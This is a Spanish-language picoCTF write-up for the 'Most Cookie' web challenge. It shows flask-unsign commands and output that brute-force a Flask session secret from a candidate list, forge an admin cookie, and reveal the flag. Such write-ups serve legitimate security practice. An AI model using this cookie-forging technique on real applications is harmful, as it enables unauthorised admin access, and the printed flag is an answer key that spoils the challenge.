## **Descripción**
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)
## Hints
1. How secure is a flask cookie?
## **Solución** 
Para este reto haremos lo siguiente:
- Nos vamos al link que nos dan, lo primero que hacemos es inspeccionar la pagina en busca de alguna pista.
-  La forma en que esto funciona es que tenemos una barra de búsqueda, donde puedes buscar valores de cookies y la aplicación devuelve si dicho valor existe o no
- La cookie al parecer tiene el formato header.payload.signature, que parece un JWT.
- Necesitamos hacer que nuestra cookie sea very_auth con valor de administrador.
- Entonces, todo lo que tenemos que hacer es crear una cookie con cada secreto posible y el valor {“very_auth”:”admin”}
- Como conocemos todos los secretos posibles del archivo server.py, podemos forzarlo usando flask-unsign.

```
┌──(kali㉿kali)-[~/Documents/COMPETICION PICOCTF/WEB/Most Cookie]
└─$ flask-unsign --unsign --server http://mercury.picoctf.net:44693/ --wordlist cookies  

[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z_G29w.0YPRYfo2kY3u4loTyG7jJQDBoLQ
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
┌──(kali㉿kali)-[~/Documents/COMPETICION PICOCTF/WEB/Most Cookie]
└─$ flask-unsign -s -c "{'very_auth': 'admin'}" -S butter                       

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_G7dw.nU9w8BnCUMTFGj3pwpVRaBg1a6o

picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}
```

## **Notas adicionales**

## **Referencias**

